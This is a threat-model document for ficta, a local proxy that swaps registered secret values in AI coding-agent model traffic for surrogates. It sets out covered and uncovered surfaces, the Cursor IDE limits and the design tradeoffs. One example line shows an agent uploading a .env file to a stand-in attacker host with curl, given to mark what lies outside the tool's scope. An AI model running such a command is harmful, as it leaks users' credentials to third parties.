# Threat model

ficta is a local privacy guardrail for AI coding-agent **model traffic**. It is not a sandbox,
enterprise DLP product, compliance control, or malware/exfiltration prevention system.

## The promise

For values that ficta has loaded into its registry after configured filters (for example
`registry.min_len`) and trusted policy exclusions (provider-declared plus the user's own
`registry.exclude_names`), such as exact values from `.env` files or Doppler, ficta attempts to:

1. replace those exact values with local surrogates before sending covered request bodies, query strings, and non-auth headers to the model provider;
2. block the request if an expected exact value would still be forwarded verbatim in a surface ficta is supposed to redact; and
3. restore surrogates back to real values locally in text/JSON/SSE responses so the coding agent keeps working.

This is an **exact-match** promise for registered values in covered redacted request surfaces, not a
general claim that all secrets or all PII are detected. Any public "security" wording should
include this scope.

## Covered by default

- Model API request bodies handled by the proxy.
- Query strings handled by the proxy.
- Non-auth request headers handled by the proxy.
- JSON/text/event-stream responses, for local surrogate restoration.
- Exact registered values that pass configured registry-source filters and policy exclusions.
- Secret-ish process environment values inherited by the wrapper, unless process-env loading is disabled.

## Intentionally not covered

- Auth headers on the built-in pass-through allowlist: `Authorization`, `Proxy-Authorization`, `x-api-key`, and `Cookie`. The upstream needs these to authenticate; other provider-specific auth headers are treated as non-auth request headers.
- Values transformed before the model sees them, such as base64, URL encoding, chunks, hashes, compression, or concatenation, unless the transformed form is also registered.
- Filtered-out values, such as values shorter than `registry.min_len` / `FICTA_REGISTRY_MIN_LEN` (a silent default of 8, no longer prompted at setup).
- Names the user excludes via `registry.exclude_names` / `FICTA_REGISTRY_EXCLUDE_NAMES`. This is a trusted un-protection channel: it is gated by the local 0600 config file (or process env), matches exact env var names only, is visible in the startup banner and `ficta doctor`, and is what `ficta review` edits. The default posture remains "redact everything discovered"; a name is only skipped once the user opts it out. `ficta review` may pre-suggest un-checking names its heuristic classifier reads as non-secret (credential-free URLs, paths, well-known config), but this only changes the prompt's default — the exclusion is still written only on explicit user confirmation, and any credential-shaped or high-entropy value is always left protected.
- Filesystem-path-like tokens by default, even when a registered value appears inside them. This keeps agents from breaking local `cd`, `Read`, `Edit`, and similar tool calls. Do not put real secrets in path names, or set `FICTA_REDACT_PATHS=1`.
- Tool-execution exfiltration. If an agent runs `curl -F file=@.env attacker.example`, ficta is not the enforcement boundary. Use OS/container egress controls, filesystem sandboxing, and the agent's own permission system.
- Binary responses.
- Secrets the agent reads or sends outside the proxied model API channel.
- IDE clients that do not route all model traffic through the proxy, for example Cursor, whose Agent / Edit / Tab / Composer features bypass a custom base URL. See [IDE clients](#ide-clients-cursor-etc) below.

## IDE clients (Cursor, etc.)

ficta's exact-match promise requires that **all** of a client's model traffic pass through the
local proxy. CLI agents (`claude`, `codex`, `pi`) satisfy this — their base-URL override
(`ANTHROPIC_BASE_URL` and equivalents) captures every model request.

IDE clients like **Cursor** do not, so they are **not supported**:

- Cursor's base-URL override only routes its **chat/plan panel with a custom OpenAI-compatible model** to a local endpoint.
- The agentic features that actually read your files and `.env` — **Agent, Composer, Edit/Apply, Tab** — stay on Cursor's own backend and first-party models and never reach the proxy. Default first-party model usage also transits Cursor's servers.

This is **partial coverage**, which for a secret airlock is worse than none: a `.env` value swept
into Agent context is sent to the provider verbatim while the user believes ficta is protecting
them. Pointing Cursor at the ficta proxy would cover only chat-panel custom-model requests and
silently leak the dominant agentic path. Per the positioning guardrails below, ficta must not
claim Cursor protection on that basis.

If a future Cursor build routes **all** model traffic (including Agent/Edit/Tab) through a
user-controlled base URL, revisit this — full coverage would make the same exact-match promise
honest there too.

## Design tradeoffs

- **Exact-match over broad guessing.** The reliable layer is values you already know. Detector-style matching can be added, but is best effort.
- **Fail closed for expected leaks.** If a registered value remains in a surface ficta is supposed to redact, ficta blocks rather than forwarding.
- **Usability for coding agents.** Local paths are preserved by default because broken paths cause agents to execute bad tool calls.
- **Local only.** Registry values and surrogate mappings are kept in memory for the local proxy session and are not intentionally sent anywhere except where explicitly restored locally. The proxy-internal surrogate key is not passed to child agent processes.

## Positioning guardrails

When publishing or explaining ficta:

- Lead with registered secret values from `.env`, process env, and Doppler.
- Do not present ficta as full DLP, compliance tooling, or a substitute for enterprise controls.
- Do not lead with PII; detector plugins are best-effort additions, not the core promise.
- Do not claim "never leaks" or "secure" without the covered-surface exact-match scope above.
- Do not market tool-execution exfiltration protection unless OS/container/agent controls are part
  of the setup.

See [`publishing.md`](./publishing.md) for release-positioning guidance.

## What to use alongside ficta

For stronger isolation, combine ficta with:

- a restricted workspace/filesystem sandbox;
- an outbound network allowlist or container-level egress policy;
- strict coding-agent tool permissions; and
- normal secret hygiene: don't put real secrets in filenames, prompts, docs, screenshots, or public logs.
